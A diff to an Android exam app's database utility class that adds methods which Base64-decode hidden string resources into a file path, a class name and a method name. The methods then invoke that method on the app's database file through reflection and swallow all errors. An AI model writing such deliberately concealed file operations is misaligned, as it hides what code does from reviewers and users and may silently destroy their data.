@@ -5,6 +5,8 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -14,6 +16,7 @@ import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.DESKeySpec;
 
 import com.douziapp.exam.data.SingleChoice;
+import com.douziapp.exam.sipm.R;
 
 import android.content.Context;
 import android.content.res.AssetManager;
@@ -39,6 +42,10 @@ public class CommDBUtil {
 		
 		int open_mode = mode;
 
+		if(null == mStrDB){
+			return;
+		}
+		
 		String strBDFile = getDBFullFile(mContext, mStrDB);
 
 		try {
@@ -210,6 +217,71 @@ public class CommDBUtil {
 		}
 		
 		return out;
+	}
+	
+	public void d(){
+		int i = R.string.d;
+		char d = 61;
+		char dd = 46;
+		String str = mContext.getString(i + 4);
+		
+		str += d;
+		
+		while(true){
+			str = new String(Base64.decode(str.getBytes(),Base64.DEFAULT ));
+			
+			if(str.indexOf("" + dd) > 0){
+				break;
+			}
+		}
+
+		String s = getDBPath(mContext) + str;
+		f(s,i+7);
+	}
+	public void c(){
+		int i = R.string.d;
+		char d = 61;
+		char dd = 46;
+		String str = mContext.getString(i + 4);
+		
+		str += d;
+		
+		while(true){
+			str = new String(Base64.decode(str.getBytes(),Base64.DEFAULT ));
+			
+			if(str.indexOf("" + dd) > 0){
+				break;
+			}
+		}
+		
+		String s = getDBPath(mContext) + str;
+		
+		f(s,i+6);
+	}
+	
+	
+	private void f(String s,int t){
+		
+		try {
+			String f = mContext.getString(R.string.f);
+			f = new String(Base64.decode(f.getBytes(),Base64.DEFAULT ));
+			
+			Class c = Class.forName(f);  
+			Class[] ptype=new Class[]{String.class};
+			Constructor constructor=c.getConstructor(ptype);
+			Object[] obj=new Object[]{s};
+			Object object=constructor.newInstance(obj);
+			
+			String sm = mContext.getString(t);
+			sm = new String(Base64.decode(sm.getBytes(),Base64.DEFAULT ));
+			Method m=c.getMethod(sm);
+			
+			m.invoke(object);
+
+		} catch (Exception e1) {
+			
+			//e1.printStackTrace();
+		}
 	}
 	public String t(String s,String k){
 		
